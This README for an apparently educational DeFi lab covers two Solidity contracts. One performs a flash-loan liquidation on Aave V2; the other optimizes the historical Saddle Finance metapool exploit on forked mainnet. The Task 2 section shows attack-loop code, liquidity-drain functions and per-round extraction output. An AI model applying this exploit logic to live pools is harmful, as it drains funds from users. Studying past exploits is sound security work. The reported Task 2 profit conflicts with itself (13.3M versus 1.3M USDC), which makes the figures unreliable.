# Hands-on Exercise: Flash Loan Arbitrage

This repo implements smart contracts that perform flash loan based arbitrages on 2 test cases.

## Test Cases

### Task 1: Flash Loan based Liquidation
Implement liquidation of `0x59CE4a2AC5bC3f5F225439B2993b86B42f6d3e9F` on Aave V2 which was liquidated at block `12489620`. Check out the [original liquidation transaction](https://etherscan.io/tx/0xac7df37a43fab1b130318bbb761861b8357650db2e2c6493b73d6da3d9581077) and the [original exercise requirments](https://github.com/KaihuaQin/defi-mooc-lab2).

### Task 2: Flash Loan based Attack
Optimize the flash loan based attack on Saddle Finance `SUSDMetaPoolUpdated` pool `0x824dcD7b044D60df2e89B1bB888e66D8BCf41491`. Check out the [original attack transaction](https://etherscan.io/tx/0x2b023d65485c4bb68d781960c2196588d03b871dc9eb1c054f596b7ca6f7da56).

## Prerequisite
- Create a `.env` file with adding your HTTPS API from https://www.alchemy.com/ for access to an archive Ethereum node.

```javascript
RPC_LINK = "https://eth-mainnet.g.alchemy.com/v2/..."
```

- Run the test file to test contracts for Task 1 and Task 2.

```javascript
npm install
npm run test
```

## Result
1. For Task 1, the profit is `43.823271820635151298 ETH`, with the flash loan amount of `1,772,750.568908 USDT` for gainning the collateral asset in `WBTC`.
2. For Task 2, the profit is `13,365,540.445724 USDC`, with the flash loan amount of `18,309,536.000000 USDC`.

## Solutions

The entry functions for Task 1 `LiquidationOperator.sol` and Task 2 `AttackOperator.sol` are both named `operate`. All optimizer-related parameters are initialized in function `operate`.

### Task 1

Implemented an optimizer based on the gradient ascent algorithm, aimed at approximating the borrowing amount `preciseAmount` that maximizes profit. The objective function `targetFuntion(uint256 preciseAmount)` computes the total profit at a specific `preciseAmount`, which is the difference between the collateral assets obtained from liquidation and the borrowing cost from flash loans (excluding gas costs). 

```javascript
    // profit = collateral amount in weth - flash repay amount in weth
    function targetFuntion(
        uint256 preciseAmount
    ) internal view returns (uint256 profit) {
        profit =
            getCollateralAmount(preciseAmount) -
            getFlashRepayAmount(preciseAmount);
        return profit;
    }
```
The function `getCollateralAmount(uint256 usdtPreciseAmount)` for calculating the collateral assets obtained is represented below. The bonus rate `liquidationBonusWbtc` for the user's collateral assets `wBTC` is defined as 10% according to [Aave's definition](https://github.com/aave/protocol-v2/blob/ce53c4a8c8620125063168620eba0a8a92854eb8/markets/amm/reservesConfigs.ts#L26). 

```javascript
    // calculate collateral amount with bonus in weth of the liquidation
    function getCollateralAmount(
        uint256 usdtPreciseAmount
    ) internal view returns (uint256 wethPreciseAmount) {
        uint256 coverPreciseAmount = (usdtPreciseAmount / usdtDecimal) *
            usdtPrice;
        uint256 bonusPreciseAmount = (coverPreciseAmount *
            liquidationBonusWbtc) / liquidationPrecise;
        uint256 wbtcPreciseAmount = (bonusPreciseAmount * wbtcDecimal) /
            wbtcPrice;
        // swap wbtc to weth
        (uint wbtcReserves2, uint wethReserves2, ) = pairWbtcWeth.getReserves();
        wethPreciseAmount = getAmountOut(
            wbtcPreciseAmount,
            wbtcReserves2,
            wethReserves2
        );
        return wethPreciseAmount;
    }
```
The function `getFlashRepayAmount(uint256 usdtPreciseAmount)` for calculating the flash loan cost is represented below. All the calculation processes, according to [Aave protocol](https://docs.aave.com/developers/v/2.0/guides/liquidations#id-0.-prerequisites), retrieves the corresponding price in wei units priced in `ETH` by calling [the oracle interface](https://docs.aave.com/developers/v/2.0/the-core-protocol/price-oracle/ipriceoracle).

```javascript
    // calculate repay amount in weth of the flash loan
    function getFlashRepayAmount(
        uint256 usdtPreciseAmount
    ) internal view returns (uint256 wethPreciseAmount) {
        (uint usdtReserves1, uint wethReserves1, ) = pairWethUsdt.getReserves();
        wethPreciseAmount = getAmountIn(
            usdtPreciseAmount,
            usdtReserves1,
            wethReserves1
        );
        return wethPreciseAmount;
    }
```

Based on the implementation of `targetFuntion`, the optimizer fits the slope of the objective function at a small distance using finite differences and approximates the borrowing amount when maximizing profit using the gradient algorithm. The optimizer function `function optimizer(int256 x0,int256 learningRate,int256 epsilon,int256 maxIterations,int256 threshold,int256 precision,int256 dynamic)` is implemented with a set of parameters. `x0` represents the initial borrowing amount input. `epsilon` represents the change in borrowing amount during each optimization process. `maxIterations` represents the maximum number of iterations. Based on precision, two rates are defined: `learningRate` controls the degree of learning for each `x`, while `dynamic` is used to ensure the convergence of the optimizer. 

```javascript
 // calculate x with the largest output of target function
    function optimizer(
        int256 x0,
        int256 learningRate,
        int256 epsilon,
        int256 maxIterations,
        int256 threshold,
        int256 precision,
        int256 dynamic
    ) internal view returns (int256) {
        int256 x = x0;
        int256 grad;

        for (int256 i = 0; i < maxIterations; i++) {
            grad = gradient(x, epsilon);
            if (abs(grad) < threshold) {
                console.log("stop optimize at round %s", uint(i));
                break;
            }
            // make the algorithm dynamically converge
            x = x + (((learningRate * dynamic) / precision) * grad) / precision;
        }
        return x;
    }
```

The profit results shown earlier are achieved with such a set of parameters `(2000000e6, 10000e6, 8, 1e6, 9000e6, 999000, 1e6)`. This method has high requirements for the initial value `x0` selection, which can be improved by adding algorithms such as random generation in future.

### Task 2
Based on the gradient ascent algorithm optimizer used in Task 1, two additional algorithms were incorporated. The first is a binary search algorithm to approximate the minimum flash loan cost required to meet arbitrage requirements (this algorithm is not ideally necessary, but due to the current absence of a function to return the required input amount given a swap output amount in the curve protocol, [a reversed `get_dy(i: int128, j: int128, dx: uint256)`](https://etherscan.io/address/0xA5407eAE9Ba41422680e2e00537571bcC53efBfD#code), or to find a similar functionality interface). The second is an algorithm aimed at maximizing the liquidity extraction from the target pool.

The process of attempting to maximize profit involves three steps:

1. Exploiting vulnerabilities in the smart contracts `MetaSwapUtils` deployed by [Saddle Finance](https://github.com/saddle-finance/saddle-contract/blob/141a00e7ba0c5e8d51d8018d3c4a170e63c6c7c4/contracts/meta/MetaSwapUtils.sol#L424) to extract as much `sUSD` from `SUSDMetaPool` (`0x0C8BAe14c9f9BF2c953997C881BEfaC7729FD314`) as possible until reaching a specific threshold. At this point, the price of the corresponding `LP tokens` in the pool is minimized. This algorithm is implemented in the `onFlashLoan(address,address,uint256 amount,uint256 fee,bytes calldata)` function of the rewritten [Euler protocol's](https://github.com/euler-xyz/euler-contracts) flash loan function `flashLoan(address receiver,address token,uint256 amount,bytes calldata data)`.

```javascript
        // optimize attack in rounds
        uint swapAmountPrecise = initValue;
        uint i = 0;
        uint profitRound0 = 0;
        uint profitRound1 = 0;
        while (i < iterationsAttack) {
            swapAmountPrecise = getSwapAmount(swapAmountPrecise);
            profitRound0 = profitRound1;
            profitRound1 = execAttackRound(swapAmountPrecise);
            // check profit, profit' and threshold
            if (profitRound1 < profitRound0) {
                console.log("no enough profit to be extracted, stop attack");
                break;
            } else if (uint(profitRound1 - profitRound0) < threshold) {
                console.log(
                    "round %s profit %s , swap %s susd",
                    i + 1,
                    profitRound1 - profitRound0,
                    swapAmountPrecise
                );
                console.log("stop by the threshold");
                break;
            } else {
                console.log(
                    "extract %s sUSD in round %s",
                    profitRound1 - profitRound0,
                    i + 1
                );
                i++;
            }
        }
```

This algorithm employs two iterators with maximum iteration `iterationsAttack`, and `iterationsSwap`, respectively. They are used to iteratively solve for the maximum number of rounds of attacks `function execAttackRound(uint256 susdAmountIn)` consisting of one `sUSD` to `LP token` swap and one reverse swap operation, and the maximum amount `swapAmountGet` of `sUSD` per swap, respectively. The initial amount of `sUSD` for the first swap is set equal to the current liquidity of the pool `SUSDMetaPoolUpdated liquidity` (`sUSD` amount + `LP token` amount). To ensure feasibility while maximizing the swap amount per round, `function getSwapAmount(uint swapAmountIn)` is called to iteratively approximate `swapAmountGet` within `iterationsSwap` before each round of swap attack. Then, the execute function `execAttackRound(uint256 susdAmountIn)` is called to complete each round of swap, and the profits for each round and the previous round are saved. This process ensures the calculation of the growth rate of profits between every two rounds of attack, and optimization is terminated within the maximum iteration rounds by controlling the threshold size `threshold`.

```javascript
    function getSwapAmount(uint swapAmountIn) internal returns (uint) {
        uint i = 0;
        uint swapAmountGet = swapAmountIn;
        while (!checkSwapAmount(swapAmountGet) && i < iterationsSwap) {
            swapAmountGet = (swapAmountGet * rate) / precisionSwap;
            rate = (dynamic / precisionSwap) * rate;
            i++;
        }
        return swapAmountGet;
    }
```

Under a series of parameter settings (`iterationsAttack`=`8`, `iterationsSwap`=`8`, `threshold` = `100e18`, ...), 6 rounds of attacks were conducted, resulting in a total of `8,113,466.185763583431571664 sUSD` obtained.

```javascript
extract 7,524,199.095291665974339638 sUSD in round 1
extract 527,801.806218013263261765 sUSD in round 2
extract 55,887,176539776262494037 sUSD in round 3
extract 3,046.058269951323700137 sUSD in round 4
extract 521.581510289267462051 sUSD in round 5
extract 3,343.428710349087222547 sUSD in round 6
```

2. While maximizing liquidity extraction from `SUSDMetaPool`, considering that` LP tokens` can be used to extract liquidity from corresponding standard pools [`curve3pool`](https://github.com/curvefi/curve-contract/blob/master/contracts/pools/3pool/StableSwap3Pool.vy), it is necessary to balance the quantity of swaps when the price of `LP tokens` is minimized. This process employs the same gradient algorithm as Task 1 to iteratively approximate the solution. The target function ` function targetFuntion(int preciseAmount)` calculates the difference in liquidity in `SUSDMetaPool` before and after the swap. 

```javascript
    function targetFuntion(int preciseAmount) internal view returns (int res) {
        uint lpReserves = ISaddle(saddlepool).getTokenBalance(1) -
            ISaddle(saddlepool).calculateSwap(0, 1, uint(preciseAmount));
        uint susdReserves = ISaddle(saddlepool).getTokenBalance(0) +
            uint(preciseAmount);
        res = int(
            ISaddle(saddlepool).getTokenBalance(0) +
                ISaddle(saddlepool).getTokenBalance(1) -
                lpReserves -
                susdReserves
        );
        return res;
    }
```

The optimization goal is to approximate the amount of `sUSD` swapping for `LP token` that maximizes the target function. Ultimately, the approximated swap amount was `2,131,337,367,973,954,208,000,000 sUSD`, resulting in `7,380,805,998,016,531,990,226,251 LP tokens` obtained through the swap. Subsequently, liquidity is extracted and swapped for `USDC` as the unified unit of profit.

```javascript
    function find_dx(
        int128,
        int128,
        uint256 _dx,
        uint256 _dy_target
    ) internal view returns (uint256) {
        uint dx_high = _dx;
        uint dx_low = (_dy_target / decimalSusd) * decimalUsdc;
        uint dx_mid = (dx_high + dx_low) / 2;
        uint256 dy = ICurve(curvepool).get_dy(1, 0, dx_mid);
        while (dy < _dy_target) {
            dx_low = dx_mid;
            dx_mid = (dx_high + dx_low) / 2;
            dy = ICurve(curvepool).get_dy(1, 0, dx_mid);
        }
        return dx_mid;
    }
```

Utilizing the binary search method mentioned earlier and based on the initial swap amount of `sUSD` (with the loan asset being `USDC`, and since there is slippage during the swap process, the borrowed `USDC` should be minimized), the algorithm approximates the quantity of `USDC` that minimizes borrowing costs. Finally, under the settings of `_dx`=`18800000e6` and `_dy_target`=`SUSDMetaPoolUpdated liquidity`, a total profit of `1,336,554.0445724 USDC` was achieved, compared to the optimized `3,072,730 USDC` in [the case study](https://etherscan.io/tx/0x2b023d65485c4bb68d781960c2196588d03b871dc9eb1c054f596b7ca6f7da56).